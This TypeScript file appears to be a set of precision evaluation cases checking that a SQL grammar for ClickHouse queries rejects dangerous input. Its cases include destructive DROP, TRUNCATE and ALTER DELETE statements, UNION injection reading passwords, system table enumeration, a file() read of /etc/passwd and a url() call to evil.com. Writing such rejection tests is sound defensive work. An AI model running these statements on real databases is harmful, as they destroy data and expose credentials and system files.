/*
 * Grammar safety evals (precision).
 *
 * Tests that the grammar rejects dangerous or
 * undesirable SQL. Each case contains SQL that must not be parseable
 * by the grammar. A successful parse = precision failure.
 * 
 * Metric: precision = rejected / total
 * Target: 100%
 */

export interface SafetyCase {
  id: string;
  description: string;
  dangerousSQL: string;
  shouldParse: false;
}

export const SAFETY_CASES: SafetyCase[] = [
  // ── DDL / Mutation ──────────────────────────────────────────
  {
    id: "drop_table",
    description: "DDL: DROP TABLE",
    dangerousSQL: "DROP TABLE github_events",
    shouldParse: false,
  },
  {
    id: "insert_statement",
    description: "Data mutation: INSERT",
    dangerousSQL:
      "INSERT INTO github_events (type) VALUES ('MaliciousEvent')",
    shouldParse: false,
  },
  {
    id: "alter_table",
    description: "DDL: ALTER TABLE",
    dangerousSQL: "ALTER TABLE github_events DELETE WHERE 1=1",
    shouldParse: false,
  },
  {
    id: "truncate_table",
    description: "DDL: TRUNCATE TABLE",
    dangerousSQL: "TRUNCATE TABLE github_events",
    shouldParse: false,
  },
  {
    id: "update_statement",
    description: "Data mutation: UPDATE (ClickHouse ALTER UPDATE)",
    dangerousSQL:
      "ALTER TABLE github_events UPDATE type = 'Malicious' WHERE 1=1",
    shouldParse: false,
  },

  // ── Injection ───────────────────────────────────────────────
  {
    id: "sql_injection_union",
    description: "Injection via UNION",
    dangerousSQL:
      "SELECT repo_name FROM github_events UNION SELECT password FROM users",
    shouldParse: false,
  },
  {
    id: "sql_injection_comment",
    description: "Injection via SQL comment",
    dangerousSQL:
      "SELECT repo_name FROM github_events WHERE type = 'PushEvent' -- AND is_private = 0",
    shouldParse: false,
  },
  {
    id: "semicolon_chaining",
    description: "Multiple statements via semicolon",
    dangerousSQL: "SELECT 1; DROP TABLE github_events",
    shouldParse: false,
  },
  {
    id: "subquery_injection",
    description: "Subquery in FROM clause",
    dangerousSQL:
      "SELECT * FROM (SELECT * FROM system.tables) AS t",
    shouldParse: false,
  },

  // ── System table access ─────────────────────────────────────
  {
    id: "system_table_access",
    description: "Access system tables",
    dangerousSQL: "SELECT * FROM system.processes",
    shouldParse: false,
  },
  {
    id: "system_table_tables",
    description: "Enumerate all tables",
    dangerousSQL: "SELECT name FROM system.tables",
    shouldParse: false,
  },

  // ── Unbounded / dangerous reads ─────────────────────────────
  {
    id: "unbounded_select_star",
    description: "Unbounded SELECT *",
    dangerousSQL: "SELECT * FROM github_events",
    shouldParse: false,
  },
  {
    id: "select_star_with_where",
    description: "SELECT * even with WHERE",
    dangerousSQL: "SELECT * FROM github_events WHERE type = 'PushEvent'",
    shouldParse: false,
  },

  // ── ClickHouse-specific attack vectors ──────────────────────
  {
    id: "file_read",
    description: "ClickHouse file() table function",
    dangerousSQL: "SELECT * FROM file('/etc/passwd')",
    shouldParse: false,
  },
  {
    id: "url_function",
    description: "ClickHouse url() table function",
    dangerousSQL: "SELECT * FROM url('http://evil.com/steal')",
    shouldParse: false,
  },
  {
    id: "multi_table_from",
    description: "Multi-table FROM (implicit join)",
    dangerousSQL:
      "SELECT * FROM github_events, system.tables",
    shouldParse: false,
  },

  // ── JOIN / CTE (intentionally unsupported) ──────────────────
  {
    id: "join_clause",
    description: "JOIN is not in the grammar",
    dangerousSQL:
      "SELECT a.repo_name FROM github_events a JOIN system.tables b ON a.repo_name = b.name",
    shouldParse: false,
  },
  {
    id: "cte_with_clause",
    description: "CTE / WITH is not in the grammar",
    dangerousSQL:
      "WITH top_repos AS (SELECT repo_name FROM github_events LIMIT 10) SELECT * FROM top_repos",
    shouldParse: false,
  },
];
